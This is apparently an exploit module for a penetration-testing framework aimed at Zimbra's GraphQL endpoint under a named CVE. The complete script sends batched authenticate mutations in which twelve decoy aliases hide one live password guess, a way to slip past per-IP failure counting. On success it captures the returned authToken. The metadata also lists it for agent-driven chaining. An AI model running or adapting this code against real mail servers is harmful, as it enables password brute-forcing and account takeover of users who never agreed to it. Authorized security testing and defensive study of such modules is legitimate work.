#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""CVE-2026-93637 — GraphQL authenticate (batched aliases)."""

import json
import re
import secrets

from kittysploit import *
from lib.protocols.http.http_client import Http_client


class Module(Auxiliary, Http_client):
    __info__ = {
        "name": "Zimbra CVE-2026-93637 GraphQL authenticate",
        "description": (
            "Sends batched GraphQL authenticate mutations (aliases) to bypass "
            "source-IP failure counting; returns authToken on success."
        ),
        "author": ["KittySploit Team"],
        "cve": ["CVE-2026-93637"],
        "references": [
            "https://nvd.nist.gov/vuln/detail/CVE-2026-93637",
        ],
        "tags": ["zimbra", "graphql", "auth", "cve-2026-93637", "auxiliary"],
        "agent": {
            "approval_required": True,
            "produces": ["credentials"],
            "chain": {
                "suggested_followups": ["scanner/http/zimbra_cve_2026_93637_detect"],
            },
        },
    }

    username = OptString("", "Zimbra account name (user@domain)", required=True)
    password = OptString("", "Password to test", required=True)

    _GRAPHQL = "/service/extension/graphql"
    _DECOY_COUNT = 12

    def _mutation(self, account: str, primary_password: str) -> str:
        clauses = []
        for idx in range(self._DECOY_COUNT):
            clauses.append(
                f'd{idx}: authenticate(authInput: {{account: {{accountBy: name, key: "{account}"}}, '
                f'password: "decoy{idx}{secrets.token_hex(3)}"}}) {{ authToken }}'
            )
        clauses.append(
            f'live: authenticate(authInput: {{account: {{accountBy: name, key: "{account}"}}, '
            f'password: "{primary_password}"}}) {{ authToken }}'
        )
        return "mutation { " + " ".join(clauses) + " }"

    def run(self):
        account = str(self.username or "").strip()
        password = str(self.password or "")
        if not account or not password:
            print_error("username and password required")
            return False

        r = self.http_request(
            method="POST",
            path=self._GRAPHQL,
            headers={"Content-Type": "application/json"},
            data=json.dumps({"query": self._mutation(account, password)}),
        )
        if not r:
            print_error("GraphQL request failed")
            return False
        if int(r.status_code) == 503:
            print_error("HTTP 503 — source IP appears rate-limited (patched or proxied)")
            return False
        body = r.text or ""
        token_match = re.search(r'"authToken"\s*:\s*"([^"]+)"', body)
        if token_match:
            token = token_match.group(1)
            print_success(f"Valid credentials for {account}")
            print_status(f"authToken: {token[:48]}...")
            self.set_info(
                severity="critical",
                cve="CVE-2026-93637",
                username=account,
                auth_token=token,
            )
            return True
        print_warning("Authentication failed (wrong password or account locked)")
        return False